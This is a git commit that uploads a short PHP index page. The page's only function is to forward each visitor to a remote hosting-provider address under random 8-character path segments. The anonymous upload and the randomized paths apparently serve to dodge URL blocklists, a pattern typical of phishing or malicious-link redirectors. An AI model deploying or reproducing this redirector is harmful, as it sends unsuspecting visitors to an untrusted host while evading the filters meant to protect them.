47c9068051e6cd4241c7fb96c2c2760455b372e1
anumumadavum38-ops <anumumadavum38@gmail.com>
2026-07-30 10:44:49 -0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,17 @@
+<?php
+$baseUrl = 'https://1.190.153.160.host.secureserver.net/';
+
+function generateSegment($length) {
+  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
+}
+
+$urls = [
+  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+];
+
+$randomUrl = $urls[array_rand($urls)];
+header("Location: " . $randomUrl);
+exit();
+?>
